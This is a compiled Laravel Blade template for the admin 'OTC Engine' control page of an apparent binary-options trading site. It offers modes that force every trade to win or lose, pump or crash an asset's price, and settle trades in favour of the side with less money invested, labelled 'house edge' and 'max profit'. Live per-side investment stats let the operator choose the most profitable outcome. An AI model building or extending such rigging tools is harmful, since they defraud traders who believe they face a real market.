<?php $__env->startSection('title', 'OTC Control: ' . $asset->symbol); ?>
<?php $__env->startSection('page-title', '⚙️ OTC Engine — ' . $asset->symbol); ?>

<?php $__env->startPush('styles'); ?>
<style>
.control-panel {
    background: linear-gradient(135deg, var(--bg-secondary) 0%, var(--bg-card) 100%);
    border: 1px solid var(--border);
    border-radius: 16px;
    padding: 28px;
    margin-bottom: 20px;
}
.mode-selector {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
    gap: 12px;
    margin-bottom: 24px;
}
.mode-btn {
    padding: 18px;
    border-radius: 12px;
    border: 2px solid var(--border);
    background: var(--bg-primary);
    cursor: pointer;
    text-align: center;
    transition: all 0.2s;
    font-family: 'Inter', sans-serif;
    color: var(--text-secondary);
}
.mode-btn:hover { border-color: var(--accent); color: var(--text-primary); }
.mode-btn.selected-auto        { border-color: var(--accent); background: var(--accent-glow); color: var(--accent); }
.mode-btn.selected-force_win   { border-color: #10b981; background: rgba(16,185,129,0.15); color: #10b981; }
.mode-btn.selected-force_loss  { border-color: #ef4444; background: rgba(239,68,68,0.15); color: #ef4444; }
.mode-btn.selected-pump        { border-color: var(--green);  background: rgba(0,209,122,0.1); color: var(--green); }
.mode-btn.selected-crash       { border-color: var(--red);    background: rgba(255,76,106,0.1); color: var(--red); }
.mode-btn .mode-icon  { font-size: 28px; margin-bottom: 8px; }
.mode-btn .mode-label { font-size: 14px; font-weight: 700; }
.mode-btn .mode-desc  { font-size: 11px; margin-top: 4px; opacity:.7; }

.slider-row {
    display: flex;
    align-items: center;
    gap: 16px;
    padding: 16px;
    background: var(--bg-primary);
    border-radius: 10px;
    margin-bottom: 12px;
}
.slider-label { min-width: 200px; }
.slider-label .lbl { font-size: 13px; font-weight: 600; color: var(--text-primary); }
.slider-label .sub { font-size: 11px; color: var(--text-muted); margin-top: 2px; }
input[type=range] {
    flex: 1;
    -webkit-appearance: none;
    height: 4px;
    border-radius: 4px;
    background: var(--border);
    cursor: pointer;
}
input[type=range]::-webkit-slider-thumb {
    -webkit-appearance: none;
    width: 18px; height: 18px;
    border-radius: 50%;
    background: var(--accent);
    cursor: pointer;
    box-shadow: 0 0 8px rgba(79,142,247,0.5);
}
.slider-val {
    min-width: 60px;
    text-align: right;
    font-size: 18px;
    font-weight: 700;
    color: var(--text-primary);
}

.win-side-grid {
    display: grid;
    grid-template-columns: repeat(5, 1fr);
    gap: 8px;
    margin-top: 8px;
}
.win-side-btn {
    padding: 12px 8px;
    border-radius: 8px;
    border: 2px solid var(--border);
    background: var(--bg-primary);
    cursor: pointer;
    text-align: center;
    font-family: 'Inter', sans-serif;
    font-size: 11px;
    font-weight: 600;
    color: var(--text-secondary);
    transition: all 0.2s;
}
.win-side-btn:hover { border-color: var(--accent); color: var(--text-primary); }
.win-side-btn.selected { border-color: var(--orange); background: rgba(245,158,11,0.1); color: var(--orange); }

.live-stats-box {
    background: var(--bg-primary);
    border: 1px solid var(--border);
    border-radius: 12px;
    padding: 20px;
}
.side-bar {
    display: flex;
    align-items: center;
    gap: 12px;
    margin-bottom: 12px;
}
.side-bar .side-label { min-width: 80px; font-size:13px; font-weight:600; }
.side-bar .bar-track { flex:1; height: 12px; background: var(--border); border-radius: 6px; overflow:hidden; }
.side-bar .bar-fill  { height: 100%; border-radius: 6px; transition: width .5s; }
.side-bar .side-val  { min-width: 100px; text-align:right; font-size:13px; font-weight:600; }

.current-mode-indicator {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    padding: 8px 16px;
    border-radius: 20px;
    font-size: 13px;
    font-weight: 700;
    margin-bottom: 20px;
}
.mode-auto  { background: var(--accent-glow); color: var(--accent); border: 1px solid rgba(79,142,247,.3); }
.mode-pump  { background: rgba(0,209,122,0.1); color: var(--green); border: 1px solid rgba(0,209,122,.3); }
.mode-crash { background: rgba(255,76,106,0.1); color: var(--red);  border: 1px solid rgba(255,76,106,.3); }

@media(max-width:900px) {
    .control-layout { grid-template-columns: 1fr !important; }
    .mode-selector { grid-template-columns: 1fr; }
    .duration-pills { grid-template-columns: repeat(3, 1fr) !important; }
    .control-hero { padding: 18px 14px; }
}
</style>
<?php $__env->stopPush(); ?>

<?php $__env->startSection('content'); ?>

<div style="margin-bottom:16px; display:flex; align-items:center; gap:12px;">
    <a href="<?php echo e(route('admin.assets.index')); ?>" class="btn btn-ghost btn-sm">← Back</a>
    <span class="current-mode-indicator mode-<?php echo e($asset->control_mode); ?>">
        <?php if($asset->control_mode === 'pump'): ?> ▲ PUMP MODE
        <?php elseif($asset->control_mode === 'crash'): ?> ▼ CRASH MODE
        <?php else: ?> ⟳ AUTO MODE <?php endif; ?>
        <?php if($asset->control_expires_at && $asset->control_mode !== 'auto'): ?>
            — Expires: <?php echo e($asset->control_expires_at->diffForHumans()); ?>

        <?php endif; ?>
    </span>
</div>

<div class="control-layout" style="display:grid; grid-template-columns: 1fr 340px; gap:20px; align-items:start;">


<div>
<form method="POST" action="<?php echo e(route('admin.assets.control.update', $asset)); ?>" id="controlForm">
    <?php echo csrf_field(); ?>

    <div class="control-panel">
        <div style="font-size:16px;font-weight:700;margin-bottom:20px;">🎮 Market Direction Control</div>

        
        <div class="mode-selector">
            <button type="button" class="mode-btn <?php echo e($asset->control_mode === 'auto' ? 'selected-auto' : ''); ?>"
                    onclick="selectMode('auto', this)">
                <div class="mode-icon">⟳</div>
                <div class="mode-label">AUTO</div>
                <div class="mode-desc">Market moves freely (Sahi Direction Win)</div>
            </button>
            <button type="button" class="mode-btn <?php echo e($asset->control_mode === 'force_win' ? 'selected-force_win' : ''); ?>"
                    onclick="selectMode('force_win', this)">
                <div class="mode-icon">🏆</div>
                <div class="mode-label">ALWAYS WIN</div>
                <div class="mode-desc">Force all trades to WIN</div>
            </button>
            <button type="button" class="mode-btn <?php echo e($asset->control_mode === 'force_loss' ? 'selected-force_loss' : ''); ?>"
                    onclick="selectMode('force_loss', this)">
                <div class="mode-icon">💀</div>
                <div class="mode-label">ALWAYS LOSS</div>
                <div class="mode-desc">Force all trades to LOSS</div>
            </button>
            <button type="button" class="mode-btn <?php echo e($asset->control_mode === 'pump' ? 'selected-pump' : ''); ?>"
                    onclick="selectMode('pump', this)">
                <div class="mode-icon">🚀</div>
                <div class="mode-label">PUMP</div>
                <div class="mode-desc">Force UP trend (UP Wins)</div>
            </button>
            <button type="button" class="mode-btn <?php echo e($asset->control_mode === 'crash' ? 'selected-crash' : ''); ?>"
                    onclick="selectMode('crash', this)">
                <div class="mode-icon">📉</div>
                <div class="mode-label">CRASH</div>
                <div class="mode-desc">Force DOWN trend (DOWN Wins)</div>
            </button>
        </div>
        <input type="hidden" name="control_mode" id="controlModeInput" value="<?php echo e($asset->control_mode); ?>">

        
        <div class="slider-row">
            <div class="slider-label">
                <div class="lbl">🚀 Max Pump %</div>
                <div class="sub">Maximum upward movement</div>
            </div>
            <input type="range" name="max_pump_percent" min="0.1" max="50" step="0.1"
                   value="<?php echo e($asset->max_pump_percent); ?>"
                   oninput="document.getElementById('pumpVal').textContent=this.value+'%'">
            <div class="slider-val" id="pumpVal"><?php echo e($asset->max_pump_percent); ?>%</div>
        </div>

        <div class="slider-row">
            <div class="slider-label">
                <div class="lbl">📉 Max Crash %</div>
                <div class="sub">Maximum downward movement</div>
            </div>
            <input type="range" name="max_crash_percent" min="0.1" max="50" step="0.1"
                   value="<?php echo e($asset->max_crash_percent); ?>"
                   oninput="document.getElementById('crashVal').textContent=this.value+'%'">
            <div class="slider-val" id="crashVal"><?php echo e($asset->max_crash_percent); ?>%</div>
        </div>

        <div class="slider-row">
            <div class="slider-label">
                <div class="lbl">⏱ Duration (minutes)</div>
                <div class="sub">How long control mode lasts</div>
            </div>
            <input type="range" name="pump_duration_minutes" min="1" max="1440" step="1"
                   value="<?php echo e($asset->pump_duration_minutes); ?>"
                   oninput="document.getElementById('durVal').textContent=this.value+'m'">
            <div class="slider-val" id="durVal"><?php echo e($asset->pump_duration_minutes); ?>m</div>
        </div>
    </div>

    
    <div class="control-panel">
        <div style="font-size:16px;font-weight:700;margin-bottom:8px;">🎯 Win Side Control</div>
        <div style="font-size:13px;color:var(--text-muted);margin-bottom:16px;">
            Choose which side of traders will win. This overrides market direction for trade settlement.
        </div>
        <input type="hidden" name="win_side" id="winSideInput" value="<?php echo e($asset->win_side); ?>">
        <div class="win-side-grid">
            <?php
            $winSideOptions = [
                'none'                 => ['None (Market)', '—'],
                'majority_investment'  => ['Maj. Investment', '💰↑'],
                'minority_investment'  => ['Min. Investment', '💰↓'],
                'majority_users'       => ['Maj. Users', '👥↑'],
                'minority_users'       => ['Min. Users', '👥↓'],
            ];
            ?>
            <?php $__currentLoopData = $winSideOptions; $__env->addLoop($__currentLoopData); foreach($__currentLoopData as $val => [$label, $icon]): $__env->incrementLoopIndices(); $loop = $__env->getLastLoop(); ?>
            <button type="button"
                    class="win-side-btn <?php echo e($asset->win_side === $val ? 'selected' : ''); ?>"
                    onclick="selectWinSide('<?php echo e($val); ?>', this)">
                <div style="font-size:18px;margin-bottom:4px"><?php echo e($icon); ?></div>
                <?php echo e($label); ?>

            </button>
            <?php endforeach; $__env->popLoop(); $loop = $__env->getLastLoop(); ?>
        </div>
        <div style="margin-top:12px;padding:12px;background:var(--bg-primary);border-radius:8px;font-size:12px;color:var(--text-muted)">
            <strong style="color:var(--orange)">Win Side Logic:</strong><br>
            • <strong>Majority Investment</strong>: Side with more $ invested wins<br>
            • <strong>Minority Investment</strong>: Side with less $ invested wins (house edge)<br>
            • <strong>Majority Users</strong>: Side with more users wins<br>
            • <strong>Minority Users</strong>: Side with fewer users wins (max profit)
        </div>
    </div>

    
    <div class="control-panel">
        <div style="font-size:16px;font-weight:700;margin-bottom:16px;">📊 Market Parameters</div>
        <div class="grid-2">
            <div class="form-group">
                <label class="form-label">Market Volume ($)</label>
                <input type="number" name="market_volume" class="form-control" step="1000"
                       value="<?php echo e($asset->market_volume); ?>" placeholder="1000000">
            </div>
            <div class="form-group">
                <label class="form-label">Trading Capital ($)</label>
                <input type="number" name="trading_capital" class="form-control" step="1000"
                       value="<?php echo e($asset->trading_capital); ?>" placeholder="500000">
            </div>
            <div class="form-group" style="grid-column:span 2">
                <label class="form-label">Base Price Override (leave blank for auto)</label>
                <input type="number" name="base_price_override" class="form-control" step="0.00000001"
                       value="<?php echo e($asset->base_price_override); ?>" placeholder="e.g. 1.0854">
            </div>
        </div>
    </div>

    <button type="submit" class="btn btn-primary" style="width:100%;padding:14px;font-size:15px;">
        🚀 Apply OTC Engine Settings
    </button>
</form>
</div>


<div>
    <div class="live-stats-box" style="margin-bottom:16px">
        <div style="font-size:14px;font-weight:700;margin-bottom:16px;">📡 Live Trade Stats — <?php echo e($asset->symbol); ?></div>

        <?php
            $upInv   = (float)($upStats->total_investment   ?? 0);
            $downInv = (float)($downStats->total_investment ?? 0);
            $upUsr   = (int)($upStats->user_count   ?? 0);
            $downUsr = (int)($downStats->user_count ?? 0);
            $totalInv = $upInv + $downInv;
            $upPct    = $totalInv > 0 ? round($upInv / $totalInv * 100) : 50;
            $downPct  = 100 - $upPct;
        ?>

        <div style="margin-bottom:16px;">
            <div class="side-bar">
                <div class="side-label" style="color:var(--green)">▲ UP</div>
                <div class="bar-track">
                    <div class="bar-fill" style="width:<?php echo e($upPct); ?>%;background:var(--green)"></div>
                </div>
                <div class="side-val" style="color:var(--green)">$<?php echo e(number_format($upInv, 2)); ?></div>
            </div>
            <div class="side-bar">
                <div class="side-label" style="color:var(--red)">▼ DOWN</div>
                <div class="bar-track">
                    <div class="bar-fill" style="width:<?php echo e($downPct); ?>%;background:var(--red)"></div>
                </div>
                <div class="side-val" style="color:var(--red)">$<?php echo e(number_format($downInv, 2)); ?></div>
            </div>
        </div>

        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:12px;">
            <div style="padding:10px;background:rgba(0,209,122,0.05);border:1px solid rgba(0,209,122,0.2);border-radius:8px;text-align:center;">
                <div style="color:var(--text-muted)">UP Users</div>
                <div style="font-size:20px;font-weight:700;color:var(--green)"><?php echo e($upUsr); ?></div>
            </div>
            <div style="padding:10px;background:rgba(255,76,106,0.05);border:1px solid rgba(255,76,106,0.2);border-radius:8px;text-align:center;">
                <div style="color:var(--text-muted)">DOWN Users</div>
                <div style="font-size:20px;font-weight:700;color:var(--red)"><?php echo e($downUsr); ?></div>
            </div>
        </div>

        <div style="margin-top:12px;font-size:11px;color:var(--text-muted);text-align:center">
            Data refreshes on page reload
        </div>
    </div>

    
    <div style="font-size:13px;font-weight:600;margin-bottom:10px;color:var(--text-secondary)">Quick Actions</div>
    <div style="display:grid;gap:8px">
        <button type="button" onclick="quickMode('pump',5,15)" class="btn btn-success">▲ Pump 5% for 15 min</button>
        <button type="button" onclick="quickMode('pump',10,30)" class="btn btn-success">▲ Pump 10% for 30 min</button>
        <button type="button" onclick="quickMode('crash',5,15)" class="btn btn-danger">▼ Crash 5% for 15 min</button>
        <button type="button" onclick="quickMode('crash',15,60)" class="btn btn-danger">▼ Crash 15% for 60 min</button>
        <button type="button" onclick="quickMode('auto',0,0)" class="btn btn-ghost">⟳ Reset to Auto</button>
    </div>

    
    <div class="live-stats-box" style="margin-top:16px">
        <div style="font-size:13px;font-weight:600;margin-bottom:12px;">Asset Info</div>
        <div style="display:grid;gap:8px;font-size:12px;">
            <div class="flex justify-between"><span style="color:var(--text-muted)">Symbol</span><strong><?php echo e($asset->symbol); ?></strong></div>
            <div class="flex justify-between"><span style="color:var(--text-muted)">Type</span><span><?php echo e($asset->type); ?></span></div>
            <div class="flex justify-between"><span style="color:var(--text-muted)">Payout</span><span><?php echo e($asset->payout_percent); ?>%</span></div>
            <div class="flex justify-between"><span style="color:var(--text-muted)">OTC</span><span><?php echo e($asset->is_otc ? 'Yes' : 'No'); ?></span></div>
            <div class="flex justify-between"><span style="color:var(--text-muted)">Market Volume</span><span>$<?php echo e(number_format($asset->market_volume, 0)); ?></span></div>
        </div>
    </div>
</div>

</div>

<?php $__env->stopSection(); ?>

<?php $__env->startPush('scripts'); ?>
<script>
function selectMode(mode, el) {
    document.querySelectorAll('.mode-btn').forEach(b => b.className = 'mode-btn');
    el.className = `mode-btn selected-${mode}`;
    document.getElementById('controlModeInput').value = mode;
}

function selectWinSide(val, el) {
    document.querySelectorAll('.win-side-btn').forEach(b => b.classList.remove('selected'));
    el.classList.add('selected');
    document.getElementById('winSideInput').value = val;
}

function quickMode(mode, pct, dur) {
    document.getElementById('controlModeInput').value = mode;
    document.querySelectorAll('.mode-btn').forEach(b => b.className = 'mode-btn');
    document.querySelector(`.mode-btn[onclick="selectMode('${mode}', this)"]`)?.classList.add(`selected-${mode}`);

    if (mode === 'pump' && pct > 0) {
        document.querySelector('[name=max_pump_percent]').value = pct;
        document.getElementById('pumpVal').textContent = pct + '%';
    }
    if (mode === 'crash' && pct > 0) {
        document.querySelector('[name=max_crash_percent]').value = pct;
        document.getElementById('crashVal').textContent = pct + '%';
    }
    if (dur > 0) {
        document.querySelector('[name=pump_duration_minutes]').value = dur;
        document.getElementById('durVal').textContent = dur + 'm';
    }

    document.getElementById('controlForm').submit();
}
</script>
<?php $__env->stopPush(); ?>

<?php echo $__env->make('admin.layouts.app', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?><?php /**PATH /home/u881240793/domains/arslanmalik.tech/public_html/trade/resources/views/admin/assets/control.blade.php ENDPATH**/ ?>